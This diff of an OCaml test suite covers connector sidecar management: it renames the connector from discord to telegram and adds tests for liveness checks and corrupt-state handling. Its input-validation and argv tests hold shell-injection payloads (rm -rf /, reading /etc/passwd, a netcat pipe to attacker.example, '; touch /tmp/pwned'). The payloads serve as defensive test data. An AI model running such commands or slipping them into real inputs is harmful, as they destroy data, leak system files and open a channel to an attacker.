@@ -27,25 +27,20 @@ let unix_of_iso_exn value =
 ;;
 
 let make_attempt_record
-      ?(connector_id = "discord")
+      ?(connector_id = "telegram")
       ?(generation = 1)
       ?(attempt_number = 1)
-      ?attempt_id
       ?(last_result = Attempt_state.Start_dispatched)
       ?next_retry_at
       ?(operator_next_action = "none")
       ?(updated_at = "2026-01-01T00:00:00Z")
       ()
   =
-  let attempt_id =
-    Option.value attempt_id ~default:(Printf.sprintf "%d:%d" generation attempt_number)
-  in
   let next_retry_unix = Option.map unix_of_iso_exn next_retry_at in
   let updated_unix = unix_of_iso_exn updated_at in
   let attempt : Attempt_state.t =
     { generation
     ; attempt_number
-    ; attempt_id
     ; last_result
     ; next_retry_unix
     ; updated_unix
@@ -62,13 +57,6 @@ let attempt_next_retry_at (record : Routes.attempt_record) =
   Option.map Masc_domain.iso8601_of_unix_seconds record.Routes.attempt.next_retry_unix
 ;;
 
-let contains_substring haystack needle =
-  let hlen = String.length haystack in
-  let nlen = String.length needle in
-  let rec loop idx =
-    idx + nlen <= hlen && (String.sub haystack idx nlen = needle || loop (idx + 1))
-  in
-  nlen = 0 || loop 0
 ;;
 
 let rec mkdir_p path =
@@ -109,20 +97,6 @@ let env_values key env =
            (String.length prefix)
            (String.length entry - String.length prefix))
     else None)
-;;
-
-let with_env key value f =
-  let previous = Sys.getenv_opt key in
-  Fun.protect
-    ~finally:(fun () ->
-      match previous with
-      | Some existing -> Unix.putenv key existing
-      | None -> Unix.putenv key "")
-    (fun () ->
-      (match value with
-       | Some next -> Unix.putenv key next
-       | None -> Unix.putenv key "");
-      f ())
 ;;
 
 let with_temp_dir prefix f =
@@ -179,12 +153,12 @@ let test_validate_rejects_unknown_id () =
 
 let test_validate_rejects_shell_meta () =
   let payloads =
-    [ "discord;rm -rf /"
-    ; "discord && cat /etc/passwd"
-    ; "discord$(id)"
-    ; "discord`whoami`"
-    ; "discord|nc attacker.example 4444"
-    ; "discord\nimessage"
+    [ "telegram;rm -rf /"
+    ; "telegram && cat /etc/passwd"
+    ; "telegram$(id)"
+    ; "telegram`whoami`"
+    ; "telegram|nc attacker.example 4444"
+    ; "telegram\nimessage"
     ]
   in
   List.iter
@@ -197,7 +171,7 @@ let test_validate_rejects_shell_meta () =
 
 let test_validate_rejects_path_traversal () =
   let payloads =
-    [ "../../etc/passwd"; "discord/../slack"; "./discord"; "/discord"; ""; "   " ]
+    [ "../../etc/passwd"; "telegram/../imessage"; "./telegram"; "/telegram"; ""; "   " ]
   in
   List.iter
     (fun p ->
@@ -208,15 +182,15 @@ let test_validate_rejects_path_traversal () =
 ;;
 
 (* ---- Whitelist size invariant. The dashboard mirrors this list as
-       KNOWN_CONNECTOR_IDS in connector-status.ts; if a fifth bridge is
-       added without updating both, the dashboard will draw a card the
-       backend refuses to spawn. ---- *)
+       KNOWN_CONNECTOR_IDS minus IN_PROCESS_CONNECTOR_IDS in
+       connector-constants.ts; if a bridge is added without updating both,
+       the dashboard will draw a Start button the backend refuses. ---- *)
 
 let test_known_ids_size_matches_dashboard () =
   check
     int
-    "exactly 4 known sidecars (matches dashboard KNOWN_CONNECTOR_IDS)"
-    4
+    "exactly 2 external sidecars (dashboard KNOWN minus IN_PROCESS ids)"
+    2
     (List.length Routes.known_ids)
 ;;
 
@@ -246,9 +220,9 @@ let test_resolve_existing_sidecar_dir_prefers_explicit_sidecar_root () =
     let explicit_root = Filename.concat dir "explicit-root" in
     let base_path = Filename.concat dir "base-path" in
     let project_root = Filename.concat dir "project-root" in
-    let explicit_dir = Filename.concat explicit_root "sidecars/discord-bot" in
-    let base_dir = Filename.concat base_path "sidecars/discord-bot" in
-    let project_dir = Filename.concat project_root "sidecars/discord-bot" in
+    let explicit_dir = Filename.concat explicit_root "sidecars/telegram-bot" in
+    let base_dir = Filename.concat base_path "sidecars/telegram-bot" in
+    let project_dir = Filename.concat project_root "sidecars/telegram-bot" in
     List.iter mkdir_p [ explicit_dir; base_dir; project_dir ];
     check
       (option string)
@@ -258,21 +232,21 @@ let test_resolve_existing_sidecar_dir_prefers_explicit_sidecar_root () =
          ~sidecar_root:explicit_root
          ~project_root
          ~base_path
-         "discord"))
+         "telegram"))
 ;;
 
 let test_resolve_existing_sidecar_dir_falls_back_to_project_root () =
   with_temp_dir "sidecar-root-project-fallback" (fun dir ->
     let base_path = Filename.concat dir "base-path" in
     let project_root = Filename.concat dir "project-root" in
-    let project_dir = Filename.concat project_root "sidecars/discord-bot" in
+    let project_dir = Filename.concat project_root "sidecars/telegram-bot" in
     mkdir_p base_path;
     mkdir_p project_dir;
     check
       (option string)
       "project root used when base path is missing sidecars"
       (Some project_dir)
-      (Routes.resolve_existing_sidecar_dir ~project_root ~base_path "discord"))
+      (Routes.resolve_existing_sidecar_dir ~project_root ~base_path "telegram"))
 ;;
 
 let test_runtime_base_path_result_prefers_explicit_base_path () =
@@ -286,15 +260,15 @@ let test_runtime_base_path_result_prefers_explicit_base_path () =
 let test_runtime_base_path_result_fails_without_base_path () =
   with_env Env_config_core.base_path_env_key None @@ fun () ->
   with_env Env_config_core.base_path_input_env_key None @@ fun () ->
-  match Routes.runtime_sidecar_dir_result "discord" with
+  match Routes.runtime_sidecar_dir_result "telegram" with
   | Ok dir -> failf "expected missing base path error, got %s" dir
   | Error msg ->
-    check bool "mentions request base path" true (contains_substring msg "base_path");
+    check bool "mentions request base path" true (String_util.contains_substring msg "base_path");
     check
       bool
       "mentions env base path"
       true
-      (contains_substring msg Env_config_core.base_path_env_key)
+      (String_util.contains_substring msg Env_config_core.base_path_env_key)
 ;;
 
 let test_missing_sidecar_dir_message_mentions_sidecar_root_hint () =
@@ -302,28 +276,28 @@ let test_missing_sidecar_dir_message_mentions_sidecar_root_hint () =
     Routes.missing_sidecar_dir_message
       ~base_path:"/tmp/runtime-root"
       ~project_root:"/tmp/project-root"
-      "discord"
+      "telegram"
   in
   check
     bool
     "mentions explicit env hint"
     true
-    (contains_substring message "MASC_SIDECAR_ROOT=/path/to/masc");
+    (String_util.contains_substring message "MASC_SIDECAR_ROOT=/path/to/masc");
   check
     bool
     "mentions launcher flag hint"
     true
-    (contains_substring message "--sidecar-root /path/to/masc");
+    (String_util.contains_substring message "--sidecar-root /path/to/masc");
   check
     bool
     "includes searched runtime path"
     true
-    (contains_substring message "/tmp/runtime-root/sidecars/discord-bot");
+    (String_util.contains_substring message "/tmp/runtime-root/sidecars/telegram-bot");
   check
     bool
     "includes searched project path"
     true
-    (contains_substring message "/tmp/project-root/sidecars/discord-bot")
+    (String_util.contains_substring message "/tmp/project-root/sidecars/telegram-bot")
 ;;
 
 let test_runtime_base_path_uses_resolver_precedence () =
@@ -375,20 +349,20 @@ let test_status_file_prefers_existing_project_root_candidate () =
   with_temp_dir "sidecar-status-project-fallback" (fun dir ->
     let base_path = Filename.concat dir "runtime-root" in
     let project_root = Filename.concat dir "project-root" in
-    let sidecar_dir = Filename.concat project_root "sidecars/discord-bot" in
+    let sidecar_dir = Filename.concat project_root "sidecars/telegram-bot" in
     let project_status =
-      Filename.concat project_root ".masc/connectors/discord/status.json"
+      Filename.concat project_root ".masc/connectors/telegram/status.json"
     in
     mkdir_p sidecar_dir;
     write_file
       (Filename.concat sidecar_dir ".env")
-      "DISCORD_STATUS_PATH=.masc/connectors/discord/status.json\n";
+      "TELEGRAM_STATUS_PATH=.masc/connectors/telegram/status.json\n";
     write_file project_status {|{"connected":true}|};
     check
       string
       "existing project-root status wins when runtime-root path is absent"
       project_status
-      (Routes.status_file ~base_path ~project_root ~sidecar_dir "discord"))
+      (Routes.status_file ~base_path ~project_root ~sidecar_dir "telegram"))
 ;;
 
 let test_today_log_file_falls_back_to_project_root_log () =
@@ -398,19 +372,19 @@ let test_today_log_file_falls_back_to_project_root_log () =
     let log_path =
       Filename.concat
         project_root
-        (Printf.sprintf ".masc/logs/discord-sidecar-%s.log" (Routes.today_yyyymmdd ()))
+        (Printf.sprintf ".masc/logs/telegram-sidecar-%s.log" (Routes.today_yyyymmdd ()))
     in
     write_file log_path "[INFO] started\n";
     check
       string
       "project-root log found when runtime-root log is absent"
       log_path
-      (Routes.today_log_file ~base_path ~project_root "discord"))
+      (Routes.today_log_file ~base_path ~project_root "telegram"))
 ;;
 
 let test_start_plan_matches_detached_contract () =
   let base_path = "/tmp/masc runtime root" in
-  let script = "/tmp/masc runtime root/sidecars/discord-bot/run.sh" in
+  let script = "/tmp/masc runtime root/sidecars/telegram-bot/run.sh" in
   let plan = Routes.sidecar_start_plan ~base_path ~script in
   check
     (list string)
@@ -426,7 +400,7 @@ let test_start_plan_matches_detached_contract () =
 
 let test_start_plan_preserves_shell_meta_as_argv_values () =
   let base_path = "/tmp/runtime;touch /tmp/pwned" in
-  let script = "/tmp/sidecars/discord-bot/run.sh && id" in
+  let script = "/tmp/sidecars/telegram-bot/run.sh && id" in
   let plan = Routes.sidecar_start_plan ~base_path ~script in
   check
     (list string)
@@ -446,7 +420,7 @@ let test_desired_store_increments_generation () =
       Routes.write_desired_record
         ~updated_at:"2026-04-20T00:00:00Z"
         ~base_path
-        ~id:"discord"
+        ~id:"telegram"
         ~updated_by:"test"
         Routes.Desired_running
     in
@@ -454,12 +428,12 @@ let test_desired_store_increments_generation () =
       Routes.write_desired_record
         ~updated_at:"2026-04-20T00:00:01Z"
         ~base_path
-        ~id:"discord"
+        ~id:"telegram"
         ~updated_by:"test"
         Routes.Desired_stopped
     in
-    match first, second, Routes.read_desired_record ~base_path "discord" with
-    | Ok first, Ok second, Some persisted ->
+    match first, second, Routes.read_desired_record_result ~base_path "telegram" with
+    | Ok first, Ok second, Ok (Some persisted) ->
       check int "first generation" 1 first.generation;
       check int "second generation" 2 second.generation;
       check int "persisted generation" 2 persisted.generation;
@@ -474,7 +448,7 @@ let test_desired_store_increments_generation () =
 let test_reconcile_stale_generation_does_not_start () =
   let process_called = ref false in
   let delayed : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_running
     ; generation = 1
     ; updated_by = "test"
@@ -500,7 +474,7 @@ let test_reconcile_running_unavailable_starts_once () =
   let process_calls = ref 0 in
   let written_attempt = ref None in
   let desired : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_running
     ; generation = 3
     ; updated_by = "test"
@@ -545,7 +519,7 @@ let test_reconcile_running_unavailable_starts_once () =
 let test_reconcile_attempt_write_failure_does_not_start () =
   let process_calls = ref 0 in
   let desired : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_running
     ; generation = 3
     ; updated_by = "test"
@@ -573,7 +547,7 @@ let test_reconcile_attempt_write_failure_does_not_start () =
 let test_reconcile_running_unavailable_backoff_noops () =
   let process_calls = ref 0 in
   let desired : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_running
     ; generation = 3
     ; updated_by = "test"
@@ -610,7 +584,7 @@ let test_reconcile_running_unavailable_backoff_noops () =
 let test_reconcile_stopped_noops () =
   let process_called = ref false in
   let desired : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_stopped
     ; generation = 4
     ; updated_by = "test"
@@ -638,7 +612,7 @@ let test_status_json_includes_lifecycle_shape () =
        Routes.write_desired_record
          ~updated_at:"2026-04-20T00:00:00Z"
          ~base_path
-         ~id:"discord"
+         ~id:"telegram"
          ~updated_by:"test"
          Routes.Desired_running
      with
@@ -657,8 +631,8 @@ let test_status_json_includes_lifecycle_shape () =
       (result unit string)
       "attempt write"
       (Ok ())
-      (Routes.write_attempt_record ~base_path ~id:"discord" attempt);
-    let json = Routes.read_status_json ~base_path "discord" in
+      (Routes.write_attempt_record ~base_path ~id:"telegram" attempt);
+    let json = Routes.read_status_json ~base_path "telegram" in
     let open Yojson.Safe.Util in
     let lifecycle = json |> member "sidecar_lifecycle" in
     check
@@ -695,9 +669,121 @@ let test_status_json_includes_lifecycle_shape () =
       (lifecycle |> member "operator_next_action" |> to_string))
 ;;
 
+(* A status file is not a process. [run.sh stop] only sends SIGTERM; nothing
+   removes the file, and the sidecar's own shutdown path writes one last
+   record saying [connected: true] stamped at the current time. If observed
+   liveness were file presence — or even file freshness — the first stop would
+   make the connector unrestartable, because every later start would reconcile
+   to "already_available" against a dead process's parting claim.
+
+   These fixtures use real pids so the rule is exercised through the same
+   [Unix.kill pid 0] the route runs: this process for a live one, and a child
+   that has already been reaped for a dead one. *)
+let with_status_path_env f =
+  with_env "MASC_SIDECAR_ROOT" None (fun () ->
+    with_env "TELEGRAM_STATUS_PATH" None (fun () ->
+      with_env "MASC_TELEGRAM_STATUS_PATH" None (fun () ->
+        with_env "status_path" None f)))
+;;
+
+let reaped_pid () =
+  let pid = Unix.create_process "/bin/sh" [| "/bin/sh"; "-c"; "exit 0" |] Unix.stdin Unix.stdout Unix.stderr in
+  let rec reap () =
+    match Unix.waitpid [] pid with
+    | _ -> ()
+    | exception Unix.Unix_error (Unix.EINTR, _, _) -> reap ()
+  in
+  reap ();
+  pid
+;;
+
+let now_iso () = Masc_domain.iso8601_of_unix_seconds (Unix.time ())
+
+let observed_state_of_status_file contents =
+  with_status_path_env (fun () ->
+    with_temp_dir "sidecar-liveness" (fun base_path ->
+      write_file (Routes.status_file ~base_path "telegram") contents;
+      (match
+         Routes.write_desired_record
+           ~base_path
+           ~id:"telegram"
+           ~updated_by:"test"
+           Routes.Desired_running
+       with
+       | Ok _ -> ()
+       | Error msg -> failf "desired write failed: %s" msg);
+      Routes.read_status_json ~base_path "telegram"
+      |> Yojson.Safe.Util.member "sidecar_lifecycle"
+      |> Yojson.Safe.Util.member "observed_state"
+      |> Yojson.Safe.Util.to_string))
+;;
+
+let observed_state_of_record ~updated_at ~pid =
+  observed_state_of_status_file
+    (Printf.sprintf {|{"connected":true,"pid":%d,"updated_at":"%s"}|} pid updated_at)
+;;
+
+let test_stopped_sidecar_parting_record_is_not_available () =
+  (* The live failure: the dashboard restarts with stop → 800ms → start, which
+     always lands inside the stale window of the shutdown write. Only the dead
+     pid distinguishes that record from a running bot. *)
+  check
+    string
+    "a fresh record from a stopped process does not block its restart"
+    "unavailable"
+    (observed_state_of_record ~updated_at:(now_iso ()) ~pid:(reaped_pid ()))
+;;
+
+let test_running_sidecar_is_observed_available () =
+  (* The other side of the same rule: a live sidecar must keep suppressing the
+     start. [run.sh start] has no already-running guard, so a wrong answer here
+     forks a second bot onto the same token. *)
+  check
+    string
+    "a heartbeating process with a live pid is running"
+    "available"
+    (observed_state_of_record ~updated_at:(now_iso ()) ~pid:(Unix.getpid ()))
+;;
+
+let test_stale_heartbeat_is_not_observed_available () =
+  (* Pid alive, heartbeat aged out: the process exists but has stopped
+     reporting, which is the state an operator restarts out of. Also what pid
+     reuse looks like from here. *)
+  check
+    string
+    "a live pid that stopped heartbeating is not a working sidecar"
+    "unavailable"
+    (observed_state_of_record
+       ~updated_at:"2020-01-01T00:00:00Z"
+       ~pid:(Unix.getpid ()))
+;;
+
+let test_unreadable_heartbeat_is_not_observed_available () =
+  (* No parseable stamp means the record establishes nothing about the
+     process. Restarting a bot that writes garbage is the recoverable
+     direction. *)
+  check
+    string
+    "a record with no readable heartbeat cannot claim liveness"
+    "unavailable"
+    (observed_state_of_record ~updated_at:"not-a-timestamp" ~pid:(Unix.getpid ()))
+;;
+
+let test_unparseable_status_file_is_not_observed_available () =
+  (* A status file the server cannot parse still reports [available: true]
+     with [status: null], because availability only means the file was found.
+     Liveness reads the record, and there is no record here — a half-written
+     or corrupt file must not be mistaken for a running sidecar. *)
+  check
+    string
+    "a corrupt status file is not a running sidecar"
+    "unavailable"
+    (observed_state_of_status_file {|{"connected": true, "pid":|})
+;;
+
 let test_status_json_exposes_dashboard_provenance () =
   with_temp_dir "sidecar-status-provenance" (fun base_path ->
-    let json = Routes.read_status_json ~base_path "discord" in
+    let json = Routes.read_status_json ~base_path "telegram" in
     let open Yojson.Safe.Util in
     check
       string
@@ -720,7 +806,7 @@ let test_status_json_exposes_dashboard_provenance () =
     check
       string
       "default status path"
-      (Filename.concat base_path ".gate/runtime/discord/status.json")
+      (Filename.concat base_path ".gate/runtime/telegram/status.json")
       (json |> member "retention" |> member "default_status_path" |> to_string);
     check
       bool
@@ -933,7 +1019,7 @@ let test_isoish_lexical_matches_chronological () =
 (* ── retry_backoff_active (#8930 / #22246) ─────────────────────────────
    [retry_backoff_active] parses [now] at the boundary and delegates the
    deadline check to [Attempt_state.is_backoff_active]. Malformed persisted
-   [next_retry_at] values are rejected by [attempt_record_of_json] instead
+   [next_retry_at] values are rejected by [attempt_record_of_json_result] instead
    of entering the in-memory state. *)
 
 let make_attempt ~next_retry_at =
@@ -970,9 +1056,8 @@ let test_retry_backoff_inactive_when_no_deadline () =
 let test_attempt_record_of_json_rejects_malformed_next_retry_at () =
   let json =
     `Assoc
-      [ "connector_id", `String "discord"
+      [ "connector_id", `String "telegram"
       ; "generation", `Int 1
-      ; "attempt_id", `String "1:1"
       ; "attempt_number", `Int 1
       ; "last_attempt_result", `String "start_dispatched"
       ; "next_retry_at", `String "not-an-iso-stamp"
@@ -981,38 +1066,116 @@ let test_attempt_record_of_json_rejects_malformed_next_retry_at () =
       ]
   in
   (match Routes.attempt_record_of_json_result json with
-   | Error (Routes.Attempt_record_invalid_timestamp { field; value }) ->
+   | Error (Routes.Record_invalid_timestamp { field; value }) ->
      check string "field" "next_retry_at" field;
      check string "value" "not-an-iso-stamp" value
    | Error error ->
      failf
        "unexpected decode error: %s"
-       (Routes.attempt_record_decode_error_to_string error)
-   | Ok _ -> failf "malformed next_retry_at should be rejected at boundary");
-  check bool "compat option wrapper still rejects" true (Routes.attempt_record_of_json json = None)
+       (Routes.record_decode_error_to_string error)
+   | Ok _ -> failf "malformed next_retry_at should be rejected at boundary")
+;;
+
+let test_desired_record_of_json_rejects_unknown_state () =
+  let json =
+    `Assoc
+      [ "connector_id", `String "telegram"
+      ; "desired_state", `String "sideways"
+      ; "generation", `Int 1
+      ; "updated_by", `String "test"
+      ; "updated_at", `String "2026-01-01T00:00:00Z"
+      ]
+  in
+  match Routes.desired_record_of_json_result json with
+  | Error (Routes.Record_unknown_value { field; value }) ->
+    check string "field" "desired_state" field;
+    check string "value" "sideways" value
+  | Error error ->
+    failf
+      "unexpected decode error: %s"
+      (Routes.record_decode_error_to_string error)
+  | Ok _ -> failf "unknown desired_state should be rejected at boundary"
+;;
+
+let corrupt_desired_record_json =
+  {|{"connector_id":"telegram","desired_state":"sideways","generation":1,"updated_by":"test","updated_at":"2026-01-01T00:00:00Z"}|}
+;;
+
+let test_read_desired_record_result_reports_semantic_corruption () =
+  with_temp_dir "sidecar-desired-corrupt-read" (fun base_path ->
+    let path = Routes.sidecar_desired_path ~base_path "telegram" in
+    write_file path corrupt_desired_record_json;
+    match Routes.read_desired_record_result ~base_path "telegram" with
+    | Error msg ->
+      check bool "mentions field" true (String_util.contains_substring msg "desired_state");
+      check bool "mentions bad value" true (String_util.contains_substring msg "sideways")
+    | Ok None -> failf "corrupt persisted desired state must not look absent"
+    | Ok (Some _) -> failf "corrupt persisted desired state should not decode")
+;;
+
+let test_write_desired_record_fails_closed_on_corrupt_previous () =
+  with_temp_dir "sidecar-desired-corrupt-write" (fun base_path ->
+    let path = Routes.sidecar_desired_path ~base_path "telegram" in
+    write_file path corrupt_desired_record_json;
+    (match
+       Routes.write_desired_record
+         ~updated_at:"2026-04-20T00:00:00Z"
+         ~base_path
+         ~id:"telegram"
+         ~updated_by:"test"
+         Routes.Desired_running
+     with
+     | Error msg ->
+       check bool "mentions field" true (String_util.contains_substring msg "desired_state")
+     | Ok record ->
+       failf "write over corrupt desired state must fail closed, got generation %d" record.generation);
+    check
+      string
+      "corrupt file left untouched"
+      corrupt_desired_record_json
+      (In_channel.with_open_bin path In_channel.input_all))
+;;
+
+let test_status_json_surfaces_invalid_desired_state () =
+  with_temp_dir "sidecar-desired-corrupt-status" (fun base_path ->
+    let path = Routes.sidecar_desired_path ~base_path "telegram" in
+    write_file path corrupt_desired_record_json;
+    let json = Routes.read_status_json ~base_path "telegram" in
+    let open Yojson.Safe.Util in
+    let lifecycle = json |> member "sidecar_lifecycle" in
+    (match lifecycle |> member "desired_state" with
+     | `Null -> ()
+     | other -> failf "corrupt desired state must not render, got %s" (Yojson.Safe.to_string other));
+    let error =
+      match lifecycle |> member "desired_read_error" with
+      | `String msg -> msg
+      | other -> failf "expected desired_read_error string, got %s" (Yojson.Safe.to_string other)
+    in
+    check bool "mentions field" true (String_util.contains_substring error "desired_state");
+    check bool "mentions bad value" true (String_util.contains_substring error "sideways"))
 ;;
 
 let test_read_attempt_record_result_reports_semantic_corruption () =
   with_temp_dir "sidecar-attempt-corrupt-read" (fun base_path ->
-    let path = Routes.sidecar_attempt_path ~base_path "discord" in
+    let path = Routes.sidecar_attempt_path ~base_path "telegram" in
     write_file
       path
-      {|{"connector_id":"discord","generation":1,"attempt_id":"1:1","attempt_number":1,"last_attempt_result":"start_dispatched","next_retry_at":"not-an-iso-stamp","operator_next_action":"none","updated_at":"2026-01-01T00:00:00Z"}|};
-    match Routes.read_attempt_record_result ~base_path "discord" with
+      {|{"connector_id":"telegram","generation":1,"attempt_number":1,"last_attempt_result":"start_dispatched","next_retry_at":"not-an-iso-stamp","operator_next_action":"none","updated_at":"2026-01-01T00:00:00Z"}|};
+    match Routes.read_attempt_record_result ~base_path "telegram" with
     | Error msg ->
-      check bool "mentions field" true (contains_substring msg "next_retry_at");
-      check bool "mentions bad value" true (contains_substring msg "not-an-iso-stamp")
+      check bool "mentions field" true (String_util.contains_substring msg "next_retry_at");
+      check bool "mentions bad value" true (String_util.contains_substring msg "not-an-iso-stamp")
     | Ok None -> failf "corrupt persisted attempt state must not look absent"
     | Ok (Some _) -> failf "corrupt persisted attempt state should not decode")
 ;;
 
 let test_status_json_surfaces_invalid_attempt_state () =
   with_temp_dir "sidecar-attempt-corrupt-status" (fun base_path ->
-    let path = Routes.sidecar_attempt_path ~base_path "discord" in
+    let path = Routes.sidecar_attempt_path ~base_path "telegram" in
     write_file
       path
-      {|{"connector_id":"discord","generation":1,"attempt_id":"1:1","attempt_number":1,"last_attempt_result":"start_dispatched","next_retry_at":"not-an-iso-stamp","operator_next_action":"none","updated_at":"2026-01-01T00:00:00Z"}|};
-    let json = Routes.read_status_json ~base_path "discord" in
+      {|{"connector_id":"telegram","generation":1,"attempt_number":1,"last_attempt_result":"start_dispatched","next_retry_at":"not-an-iso-stamp","operator_next_action":"none","updated_at":"2026-01-01T00:00:00Z"}|};
+    let json = Routes.read_status_json ~base_path "telegram" in
     let open Yojson.Safe.Util in
     let lifecycle = json |> member "sidecar_lifecycle" in
     let error =
@@ -1020,8 +1183,8 @@ let test_status_json_surfaces_invalid_attempt_state () =
       | `String msg -> msg
       | other -> failf "expected attempt_read_error string, got %s" (Yojson.Safe.to_string other)
     in
-    check bool "mentions field" true (contains_substring error "next_retry_at");
-    check bool "mentions bad value" true (contains_substring error "not-an-iso-stamp"))
+    check bool "mentions field" true (String_util.contains_substring error "next_retry_at");
+    check bool "mentions bad value" true (String_util.contains_substring error "not-an-iso-stamp"))
 ;;
 
 let test_retry_backoff_fail_closed_on_malformed_now () =
@@ -1036,7 +1199,7 @@ let test_retry_backoff_fail_closed_on_malformed_now () =
 let test_reconcile_invalid_attempt_time_noops_without_exception () =
   let process_calls = ref 0 in
   let desired : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_running
     ; generation = 3
     ; updated_by = "test"
@@ -1073,7 +1236,7 @@ let test_reconcile_invalid_attempt_time_noops_without_exception () =
 
 let test_reconcile_start_process_exception_propagates () =
   let desired : Routes.desired_record =
-    { Routes.connector_id = "discord"
+    { Routes.connector_id = "telegram"
     ; desired_state = Routes.Desired_running
     ; generation = 1
     ; updated_by = "test"
@@ -1097,7 +1260,7 @@ let test_reconcile_start_process_exception_propagates () =
 
 let test_fetch_schema_error_on_nonzero_exit () =
   with_temp_dir "sidecar-schema-fail" (fun base_path ->
-    let sidecar_dir = Filename.concat base_path "sidecars/discord-bot" in
+    let sidecar_dir = Filename.concat base_path "sidecars/telegram-bot" in
     (* [Routes.python_argv_for] looks for [.venv/bin/python] (dotted venv) before
          falling back to [uv run]. The fake interpreter must live at the exact
          path the production code probes, otherwise this test silently exercises
@@ -1108,14 +1271,14 @@ let test_fetch_schema_error_on_nonzero_exit () =
     write_file python_bin "#!/bin/sh\nexit 1\n";
     Unix.chmod python_bin 0o755;
     Routes.reset_schema_cache ();
-    match Routes.fetch_schema ~base_path "discord" with
+    match Routes.fetch_schema ~base_path "telegram" with
     | Ok _ -> failf "expected Error when python exits non-zero"
     | Error msg ->
       check
         bool
         "error mentions schema_dump failure"
         true
-        (contains_substring msg "schema_dump failed"))
+        (String_util.contains_substring msg "schema_dump failed"))
 ;;
 
 let () =
@@ -1173,7 +1336,7 @@ let () =
             test_today_log_file_falls_back_to_project_root_log
         ] )
     ; ( "invariants"
-      , [ test_case "known_ids size = 4" `Quick test_known_ids_size_matches_dashboard ] )
+      , [ test_case "known_ids size = 2" `Quick test_known_ids_size_matches_dashboard ] )
     ; ( "start_plan"
       , [ test_case
             "detached argv contract"
@@ -1214,6 +1377,26 @@ let () =
             "status JSON exposes dashboard provenance"
             `Quick
             test_status_json_exposes_dashboard_provenance
+        ; test_case
+            "stopped sidecar's parting record does not block restart"
+            `Quick
+            test_stopped_sidecar_parting_record_is_not_available
+        ; test_case
+            "running sidecar is observed available"
+            `Quick
+            test_running_sidecar_is_observed_available
+        ; test_case
+            "stale heartbeat is not observed available"
+            `Quick
+            test_stale_heartbeat_is_not_observed_available
+        ; test_case
+            "unreadable heartbeat is not observed available"
+            `Quick
+            test_unreadable_heartbeat_is_not_observed_available
+        ; test_case
+            "corrupt status file is not observed available"
+            `Quick
+            test_unparseable_status_file_is_not_observed_available
         ] )
     ; ( "config_write_helpers"
       , [ test_case "escape: quotes + backslash" `Quick test_escape_quotes_and_backslash
@@ -1290,6 +1473,22 @@ let () =
             "malformed persisted attempt → status error"
             `Quick
             test_status_json_surfaces_invalid_attempt_state
+        ; test_case
+            "unknown desired_state → rejected at boundary"
+            `Quick
+            test_desired_record_of_json_rejects_unknown_state
+        ; test_case
+            "malformed persisted desired → read error"
+            `Quick
+            test_read_desired_record_result_reports_semantic_corruption
+        ; test_case
+            "malformed persisted desired → write fails closed"
+            `Quick
+            test_write_desired_record_fails_closed_on_corrupt_previous
+        ; test_case
+            "malformed persisted desired → status error"
+            `Quick
+            test_status_json_surfaces_invalid_desired_state
         ; test_case
             "malformed now → fail-closed"
             `Quick
